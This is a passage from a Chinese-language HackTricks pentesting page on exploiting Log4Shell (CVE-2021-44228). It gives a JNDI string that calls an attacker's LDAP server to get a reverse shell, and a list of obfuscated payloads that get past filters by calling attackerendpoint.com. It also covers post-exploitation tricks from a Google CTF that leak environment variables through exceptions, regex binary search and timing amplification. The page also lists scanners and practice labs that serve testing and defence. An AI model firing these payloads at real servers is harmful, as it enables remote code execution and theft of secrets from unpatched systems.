<p>现在您可以轻松地使用生成的 JNDI 链接来利用该漏洞并获得一个 <strong>reverse shell</strong>，只需发送到一个易受攻击的 log4j 版本：<strong><code>${ldap://10.10.14.10:1389/generated}</code></strong></p>
<h3 id="绕过方法"><a class="header" href="#绕过方法">绕过方法</a></h3>
<pre><code class="language-java">${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ı}}:ldap://...} //Notice the unicode "i"
</code></pre>
<h3 id="自动扫描器"><a class="header" href="#自动扫描器">自动扫描器</a></h3>
<ul>
<li><a href="https://github.com/fullhunt/log4j-scan">https://github.com/fullhunt/log4j-scan</a></li>
<li><a href="https://github.com/adilsoybali/Log4j-RCE-Scanner">https://github.com/adilsoybali/Log4j-RCE-Scanner</a></li>
<li><a href="https://github.com/silentsignal/burp-log4shell">https://github.com/silentsignal/burp-log4shell</a></li>
<li><a href="https://github.com/cisagov/log4j-scanner">https://github.com/cisagov/log4j-scanner</a></li>
<li><a href="https://github.com/Qualys/log4jscanwin">https://github.com/Qualys/log4jscanwin</a></li>
<li><a href="https://github.com/hillu/local-log4j-vuln-scanner">https://github.com/hillu/local-log4j-vuln-scanner</a></li>
<li><a href="https://github.com/logpresso/CVE-2021-44228-Scanner">https://github.com/logpresso/CVE-2021-44228-Scanner</a></li>
<li><a href="https://github.com/palantir/log4j-sniffer">https://github.com/palantir/log4j-sniffer</a> - 查找本地易受攻击的库</li>
</ul>
<h3 id="测试实验室"><a class="header" href="#测试实验室">测试实验室</a></h3>
<ul>
<li><a href="https://app.hackthebox.com/tracks/UHC-track"><strong>LogForge HTB 机器</strong></a></li>
<li><a href="https://tryhackme.com/room/solar"><strong>Try Hack Me Solar 房间</strong></a></li>
<li><a href="https://github.com/leonjza/log4jpwn"><strong>https://github.com/leonjza/log4jpwn</strong></a></li>
<li><a href="https://github.com/christophetd/log4shell-vulnerable-app"><strong>https://github.com/christophetd/log4shell-vulnerable-app</strong></a></li>
</ul>
<h2 id="log4shell-后利用"><a class="header" href="#log4shell-后利用">Log4Shell 后利用</a></h2>
<p>在这篇 <a href="https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/"><strong>CTF 文章</strong></a> 中很好地解释了如何 <strong>可能</strong> <strong>滥用</strong> <strong>Log4J</strong> 的某些功能。</p>
<p>Log4j 的 <a href="https://logging.apache.org/log4j/2.x/security.html"><strong>安全页面</strong></a> 有一些有趣的句子：</p>
<blockquote>
<p>从版本 2.16.0（对于 Java 8）开始，<strong>消息查找功能已被完全移除</strong>。<strong>配置中的查找仍然有效</strong>。此外，Log4j 现在默认禁用对 JNDI 的访问。配置中的 JNDI 查找现在需要显式启用。</p>
</blockquote>
<blockquote>
<p>从版本 2.17.0（以及 Java 7 和 Java 6 的 2.12.3 和 2.3.1）开始，<strong>仅配置中的查找字符串会递归展开</strong>；在任何其他用法中，仅解析顶级查找，任何嵌套查找都不会被解析。</p>
</blockquote>
<p>这意味着默认情况下，您可以 <strong>忘记使用任何 <code>jndi</code> 漏洞</strong>。此外，要执行 <strong>递归查找</strong>，您需要进行配置。</p>
<p>例如，在该 CTF 中，这在文件 log4j2.xml 中进行了配置：</p>
<pre><code class="language-xml">&lt;Console name="Console" target="SYSTEM_ERR"&gt;
&lt;PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n"&gt;
&lt;/PatternLayout&gt;
&lt;/Console&gt;
</code></pre>
<h3 id="env-lookups"><a class="header" href="#env-lookups">Env Lookups</a></h3>
<p>在 <a href="https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/">这个 CTF</a> 中，攻击者控制了 <code>${sys:cmd}</code> 的值，并需要从环境变量中提取标志。<br />
如在 <a href="jndi-java-naming-and-directory-interface-and-log4shell.html#verification"><strong>之前的有效载荷</strong></a> 页面中所见，有几种访问环境变量的方法，例如：<strong><code>${env:FLAG}</code></strong>。在这个 CTF 中这没有用，但在其他现实场景中可能会有用。</p>
<h3 id="exfiltration-in-exceptions"><a class="header" href="#exfiltration-in-exceptions">Exfiltration in Exceptions</a></h3>
<p>在 CTF 中，你 <strong>无法访问 java 应用程序的 stderr</strong>，使用 log4J，但 Log4J <strong>异常会发送到 stdout</strong>，这在 python 应用程序中被打印。这意味着触发异常时我们可以访问内容。提取标志的异常是：<strong><code>${java:${env:FLAG}}</code></strong>。这有效是因为 <strong><code>${java:CTF{blahblah}}</code></strong> 不存在，异常的值将显示标志：</p>
<p><img src="../../.gitbook/assets/image%20(1023).png" alt="" /></p>
<h3 id="conversion-patterns-exceptions"><a class="header" href="#conversion-patterns-exceptions">Conversion Patterns Exceptions</a></h3>
<p>仅提及，你还可以注入新的 <a href="https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout"><strong>转换模式</strong></a> 并触发将被记录到 <code>stdout</code> 的异常。例如：</p>
<p><img src="../../.gitbook/assets/image%20(683).png" alt="" /></p>
<p>这在提取错误消息中的数据时并没有被发现有用，因为查找在转换模式之前没有解决，但它可能对其他事情如检测有用。</p>
<h3 id="conversion-patterns-regexes"><a class="header" href="#conversion-patterns-regexes">Conversion Patterns Regexes</a></h3>
<p>然而，可以使用一些 <strong>支持正则表达式的转换模式</strong> 通过使用正则表达式和滥用 <strong>二分查找</strong> 或 <strong>基于时间</strong> 的行为来提取信息。</p>
<ul>
<li><strong>通过异常消息进行二分查找</strong></li>
</ul>
<p>转换模式 <strong><code>%replace</code></strong> 可以用来 <strong>替换</strong> <strong>字符串</strong> 中的 <strong>内容</strong>，甚至使用 <strong>正则表达式</strong>。它的工作方式是：<code>replace{pattern}{regex}{substitution}</code><br />
滥用这种行为，你可以使替换 <strong>在正则表达式匹配字符串中的任何内容时触发异常</strong>（如果未找到则不触发异常），如下所示：</p>
<pre><code class="language-bash">%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
</code></pre>
<ul>
<li><strong>基于时间的</strong></li>
</ul>
<p>正如前一节所提到的，<strong><code>%replace</code></strong> 支持 <strong>regexes</strong>。因此，可以使用来自 <a href="../regular-expression-denial-of-service-redos.html"><strong>ReDoS 页面</strong></a> 的有效载荷来导致 <strong>超时</strong>，如果找到标志。<br />
例如，像 <code>%replace{${env:FLAG}}{^(?=CTF)((.</code><em><code>)</code></em><code>)*salt$}{asd}</code> 的有效载荷将在该 CTF 中触发 <strong>超时</strong>。</p>
<p>在这个 <a href="https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/"><strong>写作</strong></a> 中，使用了 <strong>放大攻击</strong> 而不是 ReDoS 攻击来造成响应中的时间差：</p>
<blockquote>
<pre><code>/%replace{
%replace{
%replace{
%replace{
%replace{
%replace{
%replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
</code></pre>
<p>如果标志以 <code>flagGuess</code> 开头，则整个标志将被 29 个 <code>#</code> 替换（我使用这个字符是因为它可能不会是标志的一部分）。<strong>然后将结果中的每个 29 个 <code>#</code> 替换为 54 个 <code>#</code></strong>。这个过程重复 <strong>6 次</strong>，导致总共 <code>29*54*54^6* =`` ``</code><strong><code>96816014208</code></strong> <strong><code>#</code>！</strong></p>
<p>替换如此多的 <code>#</code> 将触发 Flask 应用程序的 10 秒超时，这将导致 HTTP 状态代码 500 被发送给用户。（如果标志不以 <code>flagGuess</code> 开头，我们将收到非 500 状态代码）</p>
</blockquote>
<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
<ul>
<li><a href="https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/">https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/</a></li>
<li><a href="https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/">https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/</a></li>
<li><a href="https://www.youtube.com/watch?v=XG14EstTgQ4">https://www.youtube.com/watch?v=XG14EstTgQ4</a></li>
<li><a href="https://tryhackme.com/room/solar">https://tryhackme.com/room/solar</a></li>
<li><a href="https://www.youtube.com/watch?v=Y8a5nB-vy78">https://www.youtube.com/watch?v=Y8a5nB-vy78</a></li>
<li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a></li>
<li><a href="https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/">https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/</a></li>
<li><a href="https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/">https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/</a></li>
</ul>
<p>{% hint style="success" %}
学习与实践 AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在 Twitter 上关注</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../pentesting-web/deserialization/python-yaml-deserialization.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../pentesting-web/deserialization/ruby-class-pollution.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../pentesting-web/deserialization/python-yaml-deserialization.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../pentesting-web/deserialization/ruby-class-pollution.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
